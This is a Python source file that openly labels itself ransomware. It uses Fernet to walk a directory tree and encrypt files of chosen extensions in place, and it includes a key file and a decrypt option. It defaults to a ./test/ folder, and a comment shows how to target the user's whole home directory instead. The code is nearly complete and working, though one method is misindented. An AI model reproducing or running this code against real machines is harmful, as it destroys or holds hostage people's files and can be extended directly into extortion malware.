        
   
import os;
from os.path import expanduser;
from cryptography.fernet import Fernet;

class Ransomware(object):
    def __init__(self):
        self.key = None; # Key to encrypt the files
        self.cryptor = None; # Object that does the actual encryptation
        self.file_ext_targets = ["txt","mp4"]; # Type of files, you're going to encrypt
        
    def generate_key(self):
        # Generate the initial key, to unlock files, and pass it to the crypter
        # for verifying right key for decryption
        self.key = Fernet.generate_key();
        self.cryptor = Fernet(self.key);

    def read_key(self, keyfile_name):
        # Read the key for decryption
        with open(keyfile_name, "rb") as f:
            self.key = f.read();
            self.cryptor = Fernet(self.key)
 def write_key(self, keyfile_name):
        # Saves the decryption key to file
        print(self.key);
        with open(keyfile_name, "wb") as f:
            f.write(self.key);

    def crypt_root(self, root_dir, encrypted=False):
        # Recursively encrypt or decrypt files from root directory
        for root, _, files in os.walk(root_dir):
            for f in files: 
                abs_file_path = os.path.join(root, f);
                # Continue if no target file is present in current folder
                if not abs_file_path.split(".")[-1] in self.file_ext_targets:
                    continue;
                self.crypt_file(abs_file_path, encrypted=encrypted);

    def crypt_file(self, file_path, encrypted=False):
        # Encrypt & Decrypt function
        with open(file_path, "rb+") as f:
            _data = f.read();
            if not encrypted:
                # Encrypt
                # print();
                # print(f"File contents before encryptation: {_data}");
                data = self.cryptor.encrypt(_data);
                # print(f"File contents after encryptation: {data}");
            else:
                # Decrypt
                data = self.cryptor.decrypt(_data);
                # print(f"File content before encryptation: {data}");
            
            f.seek(0);
            f.truncate();
            f.write(data);

if __name__ == "__main__":
    import timeit;
    start_time = timeit.default_timer(); # Just for an execution time profiling

    # sys_root = expanduser("~") # Use to encrypt every folder from root
    local_root = "./test/"; # Use to encrypt specific folder

    import argparse;
    parser = argparse.ArgumentParser();
    parser.add_argument("--action", required=True); 
    parser.add_argument("--keyfile");

    args = parser.parse_args();
    action = args.action.lower();
    keyfile = args.keyfile;

    ransom = Ransomware();

    if action == "decrypt":
        if keyfile is None: 
            print("Path to keyfile must be specified after --keyfile for decryption");
        else:
            ransom.read_key(keyfile);
            ransom.crypt_root(local_root, encrypted=True);
    elif action == "encrypt":
        ransom.generate_key();
        ransom.write_key("keyfile");
        ransom.crypt_root(local_root);

    elapsed = timeit.default_timer() - start_time;
    print(f"Done in {elapsed} seconds!")
